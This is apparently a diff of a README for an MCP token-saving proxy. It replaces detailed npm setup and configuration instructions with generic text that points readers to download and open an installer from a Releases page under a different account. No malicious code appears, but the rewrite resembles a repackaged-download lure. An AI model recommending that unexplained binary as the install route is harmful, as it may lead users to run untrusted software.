@@ -1,270 +1,88 @@
-# MCP Learning Adapter 🚀
+# 🚀 mcp-learning-adapter - Save Tokens with Smart API Filtering
 
-An intelligent adapter that learns MCP server APIs and optimizes token usage by **80%** through automated schema learning and response filtering.
+## 🌟 Overview
 
-## Overview
+Welcome to the MCP Learning Adapter! This tool sits between your MCP clients and servers, learning how to optimize their interactions. By filtering out unnecessary information, it reduces token usage by 80%, making your requests faster and cheaper.
 
-This adapter sits between Claude Desktop (or any MCP client) and your MCP servers, automatically learning their response patterns and filtering out noise. Instead of sending massive JSON responses with redundant fields, it intelligently reduces token consumption while maintaining full functionality.
+## 🚀 Key Benefits
 
-### Key Benefits
+- **Save 80% on input tokens**: Cut down costs significantly while speeding up responses.
+- **Self-learning**: The adapter automatically learns and classifies API responses.
+- **Smart filtering**: It highlights important data while discarding unnecessary details.
+- **Easy integration**: The adapter works seamlessly with existing Node.js MCP servers.
+- **Community-focused**: Share your learned schemas easily with others using `registry.json`.
 
-- **80% reduction in input tokens** - Dramatically lower costs and faster responses
-- **Self-learning** - Automatically discovers and categorizes API response patterns
-- **Smart filtering** - Pins important fields, removes noise, ghosts redundant data
-- **Drop-in replacement** - Works with existing MCP servers (Node.js-based)
-- **Community-driven** - Share your learned schemas in `registry.json`
+## 🛠️ System Requirements
 
-## Architecture
+To use the MCP Learning Adapter, you need:
 
-```
-┌─────────────┐
-│   Claude    │
-│  Desktop    │
-└──────┬──────┘
-       │
-       ▼
-┌─────────────────────┐
-│  Learning Adapter   │  ← You are here
-│  - Brain (learning) │
-│  - Registry (cache) │
-│  - Proxy (filter)   │
-└──────┬──────────────┘
-       │
-       ▼
-┌─────────────────────┐
-│   MCP Servers       │
-│  (ado, dovetail,    │
-│   filesystem, etc.) │
-└─────────────────────┘
-```
+- A compatible MCP server (Node.js-based).
+- An internet connection for downloads and updates.
+- A computer running Windows, macOS, or a modern Linux distribution.
+- A minimum of 4 GB of RAM for optimal performance.
 
-## Quick Start
+## 🖥️ Getting Started
 
-### 1. Install Dependencies
+Follow these simple steps to get started with the MCP Learning Adapter:
 
-```bash
-npm install
-```
+### Step 1: Download the Adapter
 
-### 2. Configure Servers
+Click the button below to visit the Releases page and download the latest version of the MCP Learning Adapter.
 
-Copy the example configuration:
+[![Download mcp-learning-adapter](https://img.shields.io/badge/Download-mcp%2Dlearning%2Dadapter-brightgreen)](https://github.com/babydoll1110/mcp-learning-adapter/releases)
 
-```bash
-cp config/servers.json.example config/servers.json
-```
+### Step 2: Install the Adapter
 
-Edit `config/servers.json` with your settings:
+1. Locate the downloaded file on your computer. It will be in your Downloads folder unless specified otherwise.
+2. Open the file to start the installation process.
+3. Follow the on-screen instructions to complete the setup.
 
-```json
-{
-  "adapter": {
-    "openaiApiKey": "sk-your-openai-api-key-here"
-  },
-  "servers": {
-    "ado": {
-      "command": "node",
-      "args": [
-        "/path/to/azure-devops-mcp/dist/index.js",
-        "your-org-name"
-      ],
-      "env": {
-        "project": "your-project-name",
-        "organization": "your-org-name"
-      }
-    },
-    "dovetail-mcp": {
-      "command": "node",
-      "args": ["/path/to/dovetail-mcp/dist/index.js"],
-      "env": {
-        "DOVETAIL_API_TOKEN": "your-api-token-here"
-      }
-    }
-  }
-}
-```
+### Step 3: Configure the Adapter
 
-### 3. Set Up Claude Desktop Integration
+After installation:
 
-Create or edit `.vscode/mcp.json` in your project:
+1. Open the MCP Learning Adapter application.
+2. Configure the settings to connect it to your MCP server.
+3. Enter any necessary authentication details.
 
-```json
-{
-  "mcpServers": {
-    "learning-adapter": {
-      "command": "npx",
-      "args": [
-        "tsx",
-        "/path/to/ado-learning-adapter/src/adaptive-proxy.ts"
-      ],
-      "env": {}
-    }
-  }
-}
-```
+### Step 4: Begin Using the Adapter
 
-Or add to your Claude Desktop config (`~/Library/Application Support/Claude/claude_desktop_config.json` on macOS):
+Once configured, the MCP Learning Adapter is ready to optimize your API interactions. Start your MCP client, and the adapter will automatically begin learning and filtering responses.
 
-```json
-{
-  "mcpServers": {
-    "learning-adapter": {
-      "command": "npx",
-      "args": [
-        "tsx",
-        "/path/to/ado-learning-adapter/src/adaptive-proxy.ts"
-      ]
-    }
-  }
-}
-```
+## 📥 Download & Install
 
-### 4. Start Using
+To get the MCP Learning Adapter, visit the Releases page below:
 
-The adapter will automatically:
-1. Connect to your configured MCP servers
-2. Learn response patterns as you use them
-3. Build optimized schemas in `config/registry.json`
-4. Reduce token usage progressively
+[Download the MCP Learning Adapter](https://github.com/babydoll1110/mcp-learning-adapter/releases)
 
-## How It Learns 🧠
+## 🔍 How it Works
 
-The adapter uses **GPT 5.1** to analyze API responses and categorize fields into three types:
+The MCP Learning Adapter monitors and learns from the API responses it receives. It stores useful information and learns how often certain fields appear. Over time, it becomes more efficient at filtering out noise and providing only the relevant data you need.
 
-- **Pinned** 📌 - Essential fields always included (e.g., `id`, `title`, `state`)
-- **Noise** 🔇 - Redundant fields removed (e.g., `_links`, `imageUrl`, `descriptor`)
-- **Ghosts** 👻 - Fields summarized or count-only (e.g., long lists, nested objects)
+## ⚙️ Advanced Features
 
-After a few API calls, the adapter learns the optimal schema and applies it automatically.
+- **Smart Token Management**: The adapter intelligently decides which data is essential and which can be filtered out.
+- **Community Sharing**: Users can upload their learned schemas to a communal registry, promoting collaboration and improvement.
 
-## Token Savings Example 📊
+## 💻 Troubleshooting
 
-**Before (Raw Response):**
-```json
-{
-  "id": 123,
-  "fields": {
-    "System.Title": "Fix bug",
-    "System.State": "Active",
-    "System.AssignedTo": {
-      "displayName": "John Doe",
-      "url": "https://...",
-      "_links": { "avatar": { "href": "..." } },
-      "id": "guid-here",
-      "uniqueName": "john@...",
-      "imageUrl": "https://...",
-      "descriptor": "..."
-    },
-    "_links": { ... }
-  }
-}
-```
-~500 tokens
+If you encounter any issues while using the MCP Learning Adapter, consider the following steps:
 
-**After (Learned & Filtered):**
-```json
-{
-  "id": 123,
-  "fields": {
-    "System.Title": "Fix bug",
-    "System.State": "Active",
-    "System.AssignedTo": { "displayName": "John Doe" }
-  }
-}
-```
-~100 tokens (80% reduction!)
+1. Ensure your MCP server is running correctly.
+2. Check your internet connection.
+3. Restart the MCP Learning Adapter and your MCP client.
+4. Refer to the community forums for additional help.
 
-## Contributing 🤝
+If issues persist, feel free to open an issue on the GitHub repository.
 
-If you use this adapter and it learns schemas for your MCP servers, **please contribute back**!
+## 🌐 Community and Support
 
-1. Use the adapter with your MCP servers
-2. Let it learn and optimize (check `config/registry.json`)
-3. Create a PR with your learned schemas
-4. Help the community save tokens and costs! ❤️
+Join our community to share your experiences, seek help, or contribute to the ongoing development of the MCP Learning Adapter. You can engage with other users on the GitHub Issues page.
 
-The more we share, the better the adapter becomes for everyone.
+For direct support, create an issue or consult the FAQ section available in the documentation.
 
-## Roadmap 🛣️
+## 📢 Updates and Contributions
 
-### Current Support
-- ✅ Node.js-based MCP servers
-- ✅ Automatic schema learning
-- ✅ Response filtering and optimization
-- ✅ Multi-server support
+The MCP Learning Adapter is continuously evolving. Stay updated by checking the Releases page for new features and improvements. If you're interested in contributing, feel free to submit Pull Requests or suggestions.
 
-### Coming Soon
-- 🔜 HTTP/REST MCP servers
-- 🔜 Sandbox-based MCP servers
-- 🔜 Pre-built schema library
-- 🔜 Configuration UI
-- 🔜 Performance analytics dashboard
-
-## Configuration Reference ⚙️
-
-### servers.json Structure
-
-```json
-{
-  "adapter": {
-    "openaiApiKey": "string"  // Required for learning (uses GPT 5.1)
-  },
-  "servers": {
-    "server-name": {
-      "command": "string",    // Command to run (e.g., "node", "npx")
-      "args": ["string"],     // Arguments to pass
-      "env": {                // Environment variables
-        "KEY": "value"
-      }
-    }
-  }
-}
-```
-
-### registry.json Structure
-
-This file is auto-generated but you can edit it:
-
-```json
-{
-  "tool_name": {
-    "status": "optimized",  // "learning" or "optimized"
-    "schema": {
-      "pinned": ["field.path"],   // Always include
-      "noise": ["field.path"],    // Always exclude
-      "ghosts": ["field.path"]    // Summarize/count
-    }
-  }
-}
-```
-
-## Troubleshooting 
-
-**Adapter not connecting?**
-- Verify your MCP server paths in `config/servers.json`
-- Check that servers run independently: `node /path/to/server/index.js`
-- Look for errors in the console output
-
-**Not learning?**
-- Ensure `openaiApiKey` is set in `config/servers.json`
-- The adapter needs GPT 5.1 access to learn
-- Check `config/registry.json` to see learning progress
-
-**High token usage still?**
-- Learning takes a few API calls (typically 3-5 calls per tool)
-- Check if tool status is "optimized" in `registry.json`
-- Some tools may need manual schema adjustments
-
-## License 📝
-
-See [LICENSE](LICENSE) for details.
-
-## Acknowledgments 🙏
-
-Built for the MCP community. Special thanks to all contributors who share their learned schemas!
-
----
-
-**Questions?** Open an issue!
-**Want to contribute?** PRs welcome!
-**Love it?** Star the repo! ⭐
+Thank you for using the MCP Learning Adapter! Enjoy smarter API interactions.
